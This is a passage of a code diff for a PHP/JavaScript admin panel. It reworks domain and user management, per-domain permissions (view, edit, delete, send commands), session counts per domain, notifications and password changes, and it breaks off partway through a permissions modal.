@@ -357,102 +357,81 @@ $uniqueDomains = array_unique($domainsList);
     // ============================================
     async function loadDomains() {
         try {
-            const response = await fetch('/getAllSessions');
+            const response = await fetch('/admin/api/getDomains.php');
             const data = await response.json();
-            const sessions = Object.values(data.data || {});
-            const domainMap = new Map();
-            
-            for (const session of sessions) {
-                const domain = session.domain || 'unknown';
-                if (!domainMap.has(domain)) domainMap.set(domain, { sessions: 0, profiles: 0, logins: 0, lastSeen: null });
-                const stats = domainMap.get(domain);
-                stats.sessions++;
-                if (session.profile_name) stats.profiles++;
-                if (session.login_email) stats.logins++;
-                const seen = session.last_seen || session.created_at;
-                if (!stats.lastSeen || seen > stats.lastSeen) stats.lastSeen = seen;
-            }
-            
+            const domains = data.domains || [];
+
+            // Also fetch live session stats
+            let sessionStats = {};
+            try {
+                const sr = await fetch('/getAllSessions');
+                const sd = await sr.json();
+                for (const s of Object.values(sd.data || {})) {
+                    const d = s.domain || 'unknown';
+                    if (!sessionStats[d]) sessionStats[d] = { sessions: 0, profiles: 0, logins: 0 };
+                    sessionStats[d].sessions++;
+                    if (s.profile_name) sessionStats[d].profiles++;
+                    if (s.login_email)  sessionStats[d].logins++;
+                }
+            } catch(e) { /* sessions API may be unavailable */ }
+
             let html = `
                 <div class="card">
                     <div class="card-header d-flex justify-content-between align-items-center">
-                        <span><i class="fas fa-globe"></i> Domains</span>
+                        <span><i class="fas fa-globe"></i> Domains (${domains.length})</span>
                         <button class="btn btn-sm btn-light" onclick="showDomainModal()"><i class="fas fa-plus"></i> Add Domain</button>
                     </div>
                     <div class="card-body p-0">
                         <table class="table table-hover">
-                            <thead><tr><th>Domain</th><th>Sessions</th><th>Profiles</th><th>Logins</th><th>Last Activity</th><th>Status</th><th>Actions</th></tr></thead>
+                            <thead><tr><th>Domain</th><th>Wildcard</th><th>Sessions</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>
                             <tbody id="domainsTable"></tbody>
-                         </table>
+                        </table>
                     </div>
                 </div>
             `;
             $('#pageContent').html(html);
-            
+
             let rows = '';
-            for (const [domain, stats] of domainMap) {
+            for (const domain of domains) {
+                const stats = sessionStats[domain.domain_name] || { sessions: 0, profiles: 0, logins: 0 };
+                const descSafe = escapeHtml(domain.description || '');
+                const nameSafe = escapeHtml(domain.domain_name);
                 rows += `<tr>
-                            <td><strong>${escapeHtml(domain)}</strong></td>
-                            <td>${stats.sessions}</td>
-                            <td>${stats.profiles}</td>
-                            <td>${stats.logins}</td>
-                            <td>${stats.lastSeen ? new Date(stats.lastSeen).toLocaleString() : 'Never'}</td>
-                            <td><span class="badge badge-active">Active</span></td>
-                            <td>
-                                <button class="btn btn-sm btn-info" onclick="editDomain('${escapeHtml(domain)}')"><i class="fas fa-edit"></i></button>
-                                <button class="btn btn-sm btn-danger" onclick="deleteDomain('${escapeHtml(domain)}')"><i class="fas fa-trash"></i></button>
-                            </td>
-                          </tr>`;
+                    <td><strong>${nameSafe}</strong>${descSafe ? `<br><small class="text-muted">${descSafe}</small>` : ''}</td>
+                    <td>${domain.is_wildcard ? '<span class="badge bg-info">All subdomains</span>' : '<span class="badge bg-secondary">Exact</span>'}</td>
+                    <td>${stats.sessions}${stats.profiles ? ` / ${stats.profiles} profiles` : ''}</td>
+                    <td><span class="badge ${domain.status === 'active' ? 'bg-success' : 'bg-secondary'}">${escapeHtml(domain.status)}</span></td>
+                    <td>${domain.created_at ? new Date(domain.created_at).toLocaleDateString() : '-'}</td>
+                    <td>
+                        <button class="btn btn-sm btn-info" onclick='editDomain(${domain.id}, ${JSON.stringify(domain.domain_name)}, ${JSON.stringify(domain.description||"")}, ${domain.is_wildcard}, ${JSON.stringify(domain.status)})'><i class="fas fa-edit"></i></button>
+                        <button class="btn btn-sm btn-danger" onclick='deleteDomain(${domain.id}, ${JSON.stringify(domain.domain_name)})'><i class="fas fa-trash"></i></button>
+                    </td>
+                </tr>`;
             }
-            $('#domainsTable').html(rows || '<tr><td colspan="7" class="text-center">No domains found</td></tr>');
+            $('#domainsTable').html(rows || '<tr><td colspan="6" class="text-center text-muted py-3">No domains found. Click "Add Domain" to create one.</td></tr>');
         } catch(e) {
-            $('#pageContent').html('<div class="alert alert-danger">Error loading domains</div>');
+            $('#pageContent').html('<div class="alert alert-danger">Error loading domains: ' + e.message + '</div>');
         }
     }
 
-    function showDomainModal() {
-        $('#domainModal').modal('show');
+    function editDomain(id, name, desc, isWildcard, status) {
+        document.getElementById('domainId').value = id;
+        document.getElementById('domainModalLabel').textContent = 'Edit Domain';
+        document.getElementById('domainName').value = name;
+        document.getElementById('domainDescription').value = desc;
+        document.getElementById('isWildcard').checked = isWildcard == 1;
+        document.getElementById('domainStatus').value = status;
+        new bootstrap.Modal(document.getElementById('domainModal')).show();
     }
 
-    function saveDomain() {
-        const domainName = $('#domainName').val();
-        const description = $('#domainDescription').val();
-        const status = $('#domainStatus').val();
-        const isWildcard = $('#isWildcard').is(':checked') ? 1 : 0;
-        
-        if (!domainName) {
-            showToast('Domain name required', 'error');
-            return;
-        }
-        
-        $.post('/admin/api/createDomain.php', {
-            domain_name: domainName,
-            description: description,
-            status: status,
-            is_wildcard: isWildcard
-        })
-        .done(function(response) {
-            if (response.success) {
-                showToast('Domain created successfully', 'success');
-                $('#domainModal').modal('hide');
-                $('#domainName, #domainDescription').val('');
-                loadDomains();
-            } else {
-                showToast(response.error || 'Failed to create domain', 'error');
-            }
-        })
-        .fail(function() {
-            showToast('Failed to create domain', 'error');
-        });
-    }
-
-    function editDomain(domain) {
-        showToast('Edit domain: ' + domain, 'info');
-    }
-
-    function deleteDomain(domain) {
-        if (confirm('Delete domain ' + domain + '? This will remove all permissions.')) {
-            showToast('Domain deleted', 'success');
+    function deleteDomain(id, name) {
+        if (confirm('Delete domain "' + name + '"? This will also remove all user permissions for this domain.')) {
+            $.post('/admin/api/deleteDomain.php', { domain_id: id })
+                .done(function(response) {
+                    if (response.success) { showToast('Domain deleted', 'success'); loadDomains(); }
+                    else showToast(response.error || 'Failed to delete domain', 'error');
+                })
+                .fail(() => showToast('Request failed', 'error'));
         }
     }
 
@@ -461,26 +440,42 @@ $uniqueDomains = array_unique($domainsList);
     // ============================================
     async function loadUsers() {
         try {
-            const response = await fetch('/admin/api/getUsers.php');
-            const data = await response.json();
-            if (data.success) {
-                allUsers = data.users || [];
-            } else {
-                allUsers = [];
-                showToast(data.error || 'Failed to load users', 'error');
+            const [usersResp, domainsResp] = await Promise.all([
+                fetch('/admin/api/getUsers.php'),
+                fetch('/admin/api/getDomains.php')
+            ]);
+            const usersData   = await usersResp.json();
+            const domainsData = await domainsResp.json();
+            allUsers   = usersData.success   ? (usersData.users   || []) : [];
+            allDomains = domainsData.success  ? (domainsData.domains || []) : [];
+
+            if (!usersData.success) showToast(usersData.error || 'Failed to load users', 'error');
+
+            // Populate domain dropdowns in modals
+            let domainOpts = '<option value="">None (global access)</option>';
+            for (const d of allDomains) {
+                domainOpts += `<option value="${escapeHtml(d.domain_name)}">${escapeHtml(d.domain_name)}${d.is_wildcard ? ' (+ all subdomains)' : ''}</option>`;
             }
-            
+            document.getElementById('userAssignedDomain').innerHTML = domainOpts;
+            document.getElementById('editAssignedDomain').innerHTML = domainOpts;
+
+            let domainIdOpts = '<option value="">Select domain…</option>';
+            for (const d of allDomains) {
+                domainIdOpts += `<option value="${d.id}">${escapeHtml(d.domain_name)}${d.is_wildcard ? ' (+ all subdomains)' : ''}</option>`;
+            }
+            document.getElementById('permDomainId').innerHTML = domainIdOpts;
+
             let html = `
                 <div class="card">
                     <div class="card-header d-flex justify-content-between align-items-center">
-                        <span><i class="fas fa-users"></i> Users</span>
+                        <span><i class="fas fa-users"></i> Users (${allUsers.length})</span>
                         <button class="btn btn-sm btn-light" onclick="showUserModal()"><i class="fas fa-plus"></i> Add User</button>
                     </div>
                     <div class="card-body p-0">
                         <table class="table table-hover">
-                            <thead><tr><th>ID</th><th>Username</th><th>Full Name</th><th>Email</th><th>Role</th><th>Status</th><th>Created</th><th>Last Login</th><th>Actions</th></tr></thead>
+                            <thead><tr><th>ID</th><th>Username</th><th>Full Name</th><th>Email</th><th>Role</th><th>Assigned Domain</th><th>Status</th><th>Last Login</th><th>Actions</th></tr></thead>
                             <tbody id="usersTable"></tbody>
-                         </table>
+                        </table>
                     </div>
                 </div>
             `;
@@ -488,84 +483,171 @@ $uniqueDomains = array_unique($domainsList);
             
             let rows = '';
             for (const user of allUsers) {
+                const domainBadge = user.assigned_domain
+                    ? `<span class="badge bg-info">${escapeHtml(user.assigned_domain)} (+ subdomains)</span>`
+                    : '<span class="text-muted small">—</span>';
                 rows += `<tr>
-                            <td>${user.id}</td>
-                            <td><strong>${escapeHtml(user.username)}</strong></td>
-                            <td>${escapeHtml(user.full_name || '-')}</td>
-                            <td>${escapeHtml(user.email || '-')}</td>
-                            <td><span class="badge badge-${user.role}">${user.role}</span></td>
-                            <td><span class="badge ${user.is_active ? 'badge-active' : 'badge-inactive'}">${user.is_active ? 'Active' : 'Inactive'}</span></td>
-                            <td>${new Date(user.created_at).toLocaleDateString()}</td>
-                            <td>${user.last_login ? new Date(user.last_login).toLocaleString() : '-'}</td>
-                            <td>
-                                <button class="btn btn-sm btn-info" onclick="editUser(${user.id})"><i class="fas fa-edit"></i></button>
-                                <button class="btn btn-sm btn-primary" onclick="managePermissions(${user.id})"><i class="fas fa-key"></i></button>
-                                ${user.id != 1 ? `<button class="btn btn-sm btn-danger" onclick="deleteUser(${user.id})"><i class="fas fa-trash"></i></button>` : ''}
-                            </td>
-                          </tr>`;
+                    <td>${user.id}</td>
+                    <td><strong>${escapeHtml(user.username)}</strong></td>
+                    <td>${escapeHtml(user.full_name || '-')}</td>
+                    <td>${escapeHtml(user.email || '-')}</td>
+                    <td><span class="badge badge-${escapeHtml(user.role)}">${escapeHtml(user.role)}</span></td>
+                    <td>${domainBadge}</td>
+                    <td><span class="badge ${user.is_active ? 'bg-success' : 'bg-secondary'}">${user.is_active ? 'Active' : 'Inactive'}</span></td>
+                    <td>${user.last_login ? new Date(user.last_login).toLocaleString() : '-'}</td>
+                    <td>
+                        <button class="btn btn-sm btn-info btn-action" title="Edit" onclick="editUser(${user.id})"><i class="fas fa-edit"></i></button>
+                        <button class="btn btn-sm btn-primary btn-action" title="Permissions" onclick="managePermissions(${user.id})"><i class="fas fa-key"></i></button>
+                        ${user.id != 1 ? `<button class="btn btn-sm btn-danger btn-action" title="Delete" onclick="deleteUser(${user.id})"><i class="fas fa-trash"></i></button>` : ''}
+                    </td>
+                </tr>`;
             }
-            $('#usersTable').html(rows || '<tr><td colspan="9" class="text-center">No users found</td></tr>');
+            $('#usersTable').html(rows || '<tr><td colspan="9" class="text-center text-muted py-3">No users found</td></tr>');
         } catch(e) {
             $('#pageContent').html('<div class="alert alert-danger">Error loading users: ' + e.message + '</div>');
         }
     }
 
     function showUserModal() {
-        $('#userModal').modal('show');
+        // Reset form
+        document.getElementById('userUsername').value = '';
+        document.getElementById('userPassword').value = '';
+        document.getElementById('userEmail').value = '';
+        document.getElementById('userFullName').value = '';
+        document.getElementById('userRole').value = 'viewer';
+        document.getElementById('userAssignedDomain').value = '';
+        new bootstrap.Modal(document.getElementById('userModal')).show();
     }
 
     function createUser() {
-        const username = $('#userUsername').val();
-        const password = $('#userPassword').val();
-        const email = $('#userEmail').val();
-        const fullName = $('#userFullName').val();
-        const role = $('#userRole').val();
-        
+        const username       = document.getElementById('userUsername').value.trim();
+        const password       = document.getElementById('userPassword').value;
+        const email          = document.getElementById('userEmail').value.trim();
+        const fullName       = document.getElementById('userFullName').value.trim();
+        const role           = document.getElementById('userRole').value;
+        const assignedDomain = document.getElementById('userAssignedDomain').value;
+
         if (!username || !password) {
             showToast('Username and password required', 'error');
             return;
         }
-        
+
         $.post('/admin/api/createUser.php', {
-            username: username,
-            password: password,
-            email: email,
-            full_name: fullName,
-            role: role
+            username: username, password: password, email: email,
+            full_name: fullName, role: role, assigned_domain: assignedDomain
         })
         .done(function(response) {
             if (response.success) {
                 showToast('User created successfully', 'success');
-                $('#userModal').modal('hide');
-                $('#userUsername, #userPassword, #userEmail, #userFullName').val('');
+                bootstrap.Modal.getInstance(document.getElementById('userModal')).hide();
                 loadUsers();
             } else {
                 showToast(response.error || 'Failed to create user', 'error');
             }
         })
-        .fail(function() {
-            showToast('Failed to create user', 'error');
-        });
+        .fail(function() { showToast('Failed to create user', 'error'); });
     }
 
     function editUser(userId) {
-        showToast('Edit user: ' + userId, 'info');
+        const user = allUsers.find(u => u.id == userId);
+        if (!user) { showToast('User not found', 'error'); return; }
+        document.getElementById('editUserId').value       = user.id;
+        document.getElementById('editUsernameDisplay').textContent = user.username;
+        document.getElementById('editEmail').value        = user.email || '';
+        document.getElementById('editFullName').value     = user.full_name || '';
+        document.getElementById('editRole').value         = user.role;
+        document.getElementById('editAssignedDomain').value = user.assigned_domain || '';
+        document.getElementById('editIsActive').checked  = user.is_active == 1;
+        new bootstrap.Modal(document.getElementById('editUserModal')).show();
+    }
+
+    function saveEditUser() {
+        const userId         = document.getElementById('editUserId').value;
+        const email          = document.getElementById('editEmail').value.trim();
+        const fullName       = document.getElementById('editFullName').value.trim();
+        const role           = document.getElementById('editRole').value;
+        const assignedDomain = document.getElementById('editAssignedDomain').value;
+        const isActive       = document.getElementById('editIsActive').checked ? 1 : 0;
+
+        $.post('/admin/api/updateUser.php', {
+            user_id: userId, email: email, full_name: fullName,
+            role: role, assigned_domain: assignedDomain, is_active: isActive
+        })
+        .done(function(response) {
+            if (response.success) {
+                showToast('User updated successfully', 'success');
+                bootstrap.Modal.getInstance(document.getElementById('editUserModal')).hide();
+                loadUsers();
+            } else {
+                showToast(response.error || 'Failed to update user', 'error');
+            }
+        })
+        .fail(function() { showToast('Failed to update user', 'error'); });
     }
 
     function managePermissions(userId) {
-        showToast('Manage permissions for user: ' + userId, 'info');
+        const user = allUsers.find(u => u.id == userId);
+        if (!user) return;
+        document.getElementById('permUserId').value = userId;
+        document.getElementById('permUsername').textContent = user.username;
+        document.getElementById('permDomainId').value = '';
+        document.getElementById('permCanView').checked = true;
+        document.getElementById('permCanEdit').checked = false;
+        document.getElementById('permCanDelete').checked = false;
+        document.getElementById('permCanCmd').checked = false;
+
+        // Load current permissions
+        fetch('/admin/api/getPermissions.php?user_id=' + userId)
+            .then(r => r.json())
+            .then(data => {
+                let rows = '';
+                for (const p of (data.permissions || [])) {
+                    rows += `<tr>
+                        <td>${escapeHtml(p.domain_name)}</td>
+                        <td>${p.can_view ? '✔' : ''}</td>
+                        <td>${p.can_edit ? '✔' : ''}</td>
+                        <td>${p.can_delete ? '✔' : ''}</td>
+                        <td>${p.can_send_commands ? '✔' : ''}</td>
+                        <td><button class="btn btn-xs btn-sm btn-danger" onclick="removePermission(${userId},${p.domain_id})"><i class="fas fa-times"></i></button></td>
+                    </tr>`;
+                }
+                document.getElementById('currentPermissionsTable').innerHTML = rows || '<tr><td colspan="6" class="text-center text-muted">No permissions assigned</td></tr>';
+            });
+
+        new bootstrap.Modal(document.getElementById('permissionsModal')).show();
+    }
+
+    function addPermission() {
+        const userId   = document.getElementById('permUserId').value;
+        const domainId = document.getElementById('permDomainId').value;
+        if (!domainId) { showToast('Please select a domain', 'error'); return; }
+        $.post('/admin/api/savePermission.php', {
+            user_id: userId, domain_id: domainId,
+            can_view: document.getElementById('permCanView').checked ? 1 : 0,
+            can_edit: document.getElementById('permCanEdit').checked ? 1 : 0,
+            can_delete: document.getElementById('permCanDelete').checked ? 1 : 0,
+            can_send_commands: document.getElementById('permCanCmd').checked ? 1 : 0
+        })
+        .done(function(r) {
+            if (r.success) { showToast('Permission saved', 'success'); managePermissions(userId); }
+            else showToast(r.error || 'Failed', 'error');
+        });
+    }
+
+    function removePermission(userId, domainId) {
+        $.post('/admin/api/deletePermission.php', { user_id: userId, domain_id: domainId })
+            .done(function(r) {
+                if (r.success) managePermissions(userId);
+                else showToast(r.error || 'Failed', 'error');
+            });
     }
 
     function deleteUser(userId) {
-        if (confirm('Delete this user?')) {
+        if (confirm('Delete this user? This action cannot be undone.')) {
             $.post('/admin/api/deleteUser.php', { user_id: userId })
                 .done(function(response) {
-                    if (response.success) {
-                        showToast('User deleted', 'success');
-                        loadUsers();
-                    } else {
-                        showToast(response.error || 'Failed to delete user', 'error');
-                    }
+                    if (response.success) { showToast('User deleted', 'success'); loadUsers(); }
+                    else showToast(response.error || 'Failed to delete user', 'error');
                 });
         }
     }
@@ -632,24 +714,27 @@ $uniqueDomains = array_unique($domainsList);
             $('#pageContent').html(html);
             
             let items = '';
+            const typeColors = { success: 'bg-success', warning: 'bg-warning', danger: 'bg-danger', info: 'bg-info', primary: 'bg-primary' };
             for (const notif of notifications) {
+                const color = typeColors[notif.type] || 'bg-secondary';
                 items += `
-                    <div class="list-group-item list-group-item-action ${!notif.is_read ? 'bg-light' : ''}">
-                        <div class="d-flex justify-content-between align-items-center">
+                    <div class="list-group-item list-group-item-action ${!notif.is_read ? 'fw-semibold' : ''}" style="${!notif.is_read ? 'background:#f0f4ff' : ''}">
+                        <div class="d-flex justify-content-between align-items-start gap-2">
                             <div>
+                                <span class="badge ${color} me-2">${escapeHtml(notif.type)}</span>
                                 <strong>${escapeHtml(notif.title)}</strong>
-                                <p class="mb-0 small">${escapeHtml(notif.message)}</p>
+                                ${notif.user_id === null ? '<span class="badge bg-secondary ms-1">Global</span>' : ''}
+                                <p class="mb-0 mt-1 text-muted">${escapeHtml(notif.message)}</p>
                                 <small class="text-muted">${new Date(notif.created_at).toLocaleString()}</small>
                             </div>
-                            <div>
-                                ${!notif.is_read ? '<span class="badge bg-primary">New</span>' : ''}
-                                <button class="btn btn-sm btn-outline-secondary" onclick="markNotificationRead(${notif.id})"><i class="fas fa-check"></i></button>
+                            <div class="d-flex gap-1 flex-shrink-0">
+                                ${!notif.is_read ? `<button class="btn btn-sm btn-outline-primary" onclick="markNotificationRead(${notif.id})" title="Mark as read"><i class="fas fa-check"></i></button>` : '<span class="text-muted small">Read</span>'}
                             </div>
                         </div>
                     </div>
                 `;
             }
-            $('#notificationsList').html(items || '<div class="text-center p-4">No notifications</div>');
+            $('#notificationsList').html(`<div class="list-group list-group-flush">${items || '<div class="text-center p-4 text-muted">No notifications</div>'}</div>`);
         } catch(e) {
             $('#pageContent').html('<div class="alert alert-danger">Error loading notifications</div>');
         }
@@ -662,27 +747,32 @@ $uniqueDomains = array_unique($domainsList);
                 let options = '<option value="all">All Users</option>';
                 if (data.users) {
                     data.users.forEach(user => {
-                        options += `<option value="${user.id}">${escapeHtml(user.username)} (${user.role})</option>`;
+                        options += `<option value="${user.id}">${escapeHtml(user.username)} (${escapeHtml(user.role)})</option>`;
                     });
                 }
-                $('#notifUserId').html(options);
+                document.getElementById('notifUserId').innerHTML = options;
             });
-        $('#notificationModal').modal('show');
+        document.getElementById('notifTitle').value = '';
+        document.getElementById('notifMessage').value = '';
+        new bootstrap.Modal(document.getElementById('notificationModal')).show();
     }
 
     function sendNotification() {
-        const userId = $('#notifUserId').val();
-        const title = $('#notifTitle').val();
-        const message = $('#notifMessage').val();
-        const type = $('#notifType').val();
-        
+        const userId  = document.getElementById('notifUserId').value;
+        const title   = document.getElementById('notifTitle').value.trim();
+        const message = document.getElementById('notifMessage').value.trim();
+        const type    = document.getElementById('notifType').value;
+
+        if (!title || !message) { showToast('Title and message required', 'error'); return; }
+
         $.post('/admin/api/sendNotification.php', { user_id: userId, title: title, message: message, type: type })
-            .done(() => {
-                showToast('Notification sent successfully', 'success');
-                $('#notificationModal').modal('hide');
-                $('#notifTitle, #notifMessage').val('');
-                loadNotifications();
-                loadNotificationCount();
+            .done(function(r) {
+                if (r.success) {
+                    showToast('Notification sent successfully', 'success');
+                    bootstrap.Modal.getInstance(document.getElementById('notificationModal')).hide();
+                    loadNotifications();
+                    loadNotificationCount();
+                } else showToast(r.error || 'Failed to send notification', 'error');
             })
             .fail(() => showToast('Failed to send notification', 'error'));
     }
@@ -779,24 +869,32 @@ $uniqueDomains = array_unique($domainsList);
     }
 
     function changePassword() {
-        $('#passwordModal').modal('show');
+        document.getElementById('currentPassword').value = '';
+        document.getElementById('newPassword').value = '';
+        document.getElementById('confirmPassword').value = '';
+        new bootstrap.Modal(document.getElementById('passwordModal')).show();
     }
 
     function updatePassword() {
-        const current = $('#currentPassword').val();
-        const newPass = $('#newPassword').val();
-        const confirm = $('#confirmPassword').val();
+        const current = document.getElementById('currentPassword').value;
+        const newPass = document.getElementById('newPassword').value;
+        const confirm = document.getElementById('confirmPassword').value;
         
         if (newPass !== confirm) {
             showToast('Passwords do not match', 'error');
             return;
         }
+        if (newPass.length < 6) {
+            showToast('Password must be at least 6 characters', 'error');
+            return;
+        }
         
         $.post('/admin/api/changePassword.php', { current: current, new: newPass })
-            .done(() => {
-                showToast('Password changed successfully', 'success');
-                $('#passwordModal').modal('hide');
-                $('#currentPassword, #newPassword, #confirmPassword').val('');
+            .done(function(r) {
+                if (r.success) {
+                    showToast('Password changed successfully', 'success');
+                    bootstrap.Modal.getInstance(document.getElementById('passwordModal')).hide();
+                } else showToast(r.error || 'Failed to change password', 'error');
             })
             .fail(() => showToast('Failed to change password', 'error'));
     }
@@ -833,7 +931,10 @@ $uniqueDomains = array_unique($domainsList);
     window.showUserModal = showUserModal;
     window.createUser = createUser;
     window.editUser = editUser;
+    window.saveEditUser = saveEditUser;
     window.managePermissions = managePermissions;
+    window.addPermission = addPermission;
+    window.removePermission = removePermission;
     window.deleteUser = deleteUser;
     window.sendNotification = sendNotification;
     window.markNotificationRead = markNotificationRead;
@@ -848,52 +949,251 @@ $uniqueDomains = array_unique($domainsList);
     window.showNotificationModal = showNotificationModal;
     </script>
 
-    <!-- Domain Modal -->
+    <!-- Domain Modal (Add / Edit) -->
     <div class="modal fade" id="domainModal" tabindex="-1">
-        <div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5><i class="fas fa-globe"></i> Add Domain</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
-        <div class="modal-body">
-            <input type="text" id="domainName" class="form-control mb-3" placeholder="Domain name">
-            <textarea id="domainDescription" class="form-control mb-3" rows="3" placeholder="Description"></textarea>
-            <div class="form-check mb-3"><input type="checkbox" id="isWildcard" class="form-check-input"> <label class="form-check-label">Wildcard (includes all subdomains)</label></div>
-            <select id="domainStatus" class="form-select"><option value="active">Active</option><option value="inactive">Inactive</option></select>
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="domainModalLabel"><i class="fas fa-globe"></i> Add Domain</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <input type="hidden" id="domainId">
+                    <div class="mb-3">
+                        <label class="form-label">Domain Name <span class="text-danger">*</span></label>
+                        <input type="text" id="domainName" class="form-control" placeholder="e.g. example.com">
+                        <small class="text-muted">Enter the main domain (e.g. example.com). Subdomains like sub.example.com are covered automatically if Wildcard is checked.</small>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Description</label>
+                        <textarea id="domainDescription" class="form-control" rows="2" placeholder="Optional description"></textarea>
+                    </div>
+                    <div class="mb-3 form-check">
+                        <input type="checkbox" id="isWildcard" class="form-check-input">
+                        <label class="form-check-label" for="isWildcard">Wildcard — includes all subdomains automatically</label>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Status</label>
+                        <select id="domainStatus" class="form-select">
+                            <option value="active">Active</option>
+                            <option value="inactive">Inactive</option>
+                            <option value="suspended">Suspended</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="saveDomain()"><i class="fas fa-save"></i> Save Domain</button>
+                </div>
+            </div>
         </div>
-        <div class="modal-footer"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-primary" onclick="saveDomain()">Save Domain</button></div></div></div>
     </div>
 
-    <!-- User Modal -->
+    <!-- Add User Modal -->
     <div class="modal fade" id="userModal" tabindex="-1">
-        <div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5><i class="fas fa-user-plus"></i> Add User</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
-        <div class="modal-body">
-            <input type="text" id="userUsername" class="form-control mb-3" placeholder="Username" required>
-            <input type="password" id="userPassword" class="form-control mb-3" placeholder="Password" required>
-            <input type="email" id="userEmail" class="form-control mb-3" placeholder="Email">
-            <input type="text" id="userFullName" class="form-control mb-3" placeholder="Full Name">
-            <select id="userRole" class="form-select mb-3"><option value="viewer">Viewer</option><option value="domain_admin">Domain Admin</option><option value="admin">Admin</option></select>
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-user-plus"></i> Add New User</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <label class="form-label">Username <span class="text-danger">*</span></label>
+                        <input type="text" id="userUsername" class="form-control" placeholder="Username" autocomplete="off">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Password <span class="text-danger">*</span></label>
+                        <input type="password" id="userPassword" class="form-control" placeholder="Password" autocomplete="new-password">
+                    </div>
+                    <div class="row g-3 mb-3">
+                        <div class="col-md-6">
+                            <label class="form-label">Email</label>
+                            <input type="email" id="userEmail" class="form-control" placeholder="Email">
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Full Name</label>
+                            <input type="text" id="userFullName" class="form-control" placeholder="Full Name">
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Role</label>
+                        <select id="userRole" class="form-select">
+                            <option value="viewer">Viewer — can only view assigned domains</option>
+                            <option value="domain_admin">Domain Admin — manages one domain + its subdomains</option>
+                            <option value="admin">Admin — manages all domains</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Assigned Domain</label>
+                        <select id="userAssignedDomain" class="form-select">
+                            <option value="">None (global access)</option>
+                        </select>
+                        <small class="text-muted">For Domain Admin: the user will see sessions only for this domain and its subdomains.</small>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="createUser()"><i class="fas fa-user-plus"></i> Create User</button>
+                </div>
+            </div>
         </div>
-        <div class="modal-footer"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-primary" onclick="createUser()">Create User</button></div></div></div>
+    </div>
+
+    <!-- Edit User Modal -->
+    <div class="modal fade" id="editUserModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-user-edit"></i> Edit User: <span id="editUsernameDisplay"></span></h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <input type="hidden" id="editUserId">
+                    <div class="row g-3 mb-3">
+                        <div class="col-md-6">
+                            <label class="form-label">Email</label>
+                            <input type="email" id="editEmail" class="form-control">
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Full Name</label>
+                            <input type="text" id="editFullName" class="form-control">
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Role</label>
+                        <select id="editRole" class="form-select">
+                            <option value="viewer">Viewer</option>
+                            <option value="domain_admin">Domain Admin</option>
+                            <option value="admin">Admin</option>
+                            <option value="super_admin">Super Admin</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Assigned Domain</label>
+                        <select id="editAssignedDomain" class="form-select">
+                            <option value="">None (global access)</option>
+                        </select>
+                        <small class="text-muted">Domain Admin users will only see sessions for this domain and its subdomains.</small>
+                    </div>
+                    <div class="mb-3 form-check">
+                        <input type="checkbox" id="editIsActive" class="form-check-input">
+                        <label class="form-check-label" for="editIsActive">Account Active</label>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="saveEditUser()"><i class="fas fa-save"></i> Save Changes</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Permissions Modal -->
+    <div class="modal fade" id="permissionsModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-key"></i> Permissions for: <span id="permUsername"></span></h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <input type="hidden" id="permUserId">
+                    <h6 class="mb-3">Current Permissions</h6>
+                    <table class="table table-sm mb-4">
+                        <thead><tr><th>Domain</th><th>View</th><th>Edit</th><th>Delete</th><th>Commands</th><th></th></tr></thead>
+                        <tbody id="currentPermissionsTable"><tr><td colspan="6" class="text-center text-muted">Loading…</td></tr></tbody>
+                    </table>
+                    <hr>
+                    <h6 class="mb-3">Add / Update Permission</h6>
+                    <div class="mb-3">
+                        <label class="form-label">Domain</label>
+                        <select id="permDomainId" class="form-select">
+                            <option value="">Select domain…</option>
+                        </select>
+                    </div>
+                    <div class="d-flex gap-4 mb-3">
+                        <div class="form-check"><input type="checkbox" id="permCanView" class="form-check-input" checked><label class="form-check-label" for="permCanView">View</label></div>
+                        <div class="form-check"><input type="checkbox" id="permCanEdit" class="form-check-input"><label class="form-check-label" for="permCanEdit">Edit</label></div>
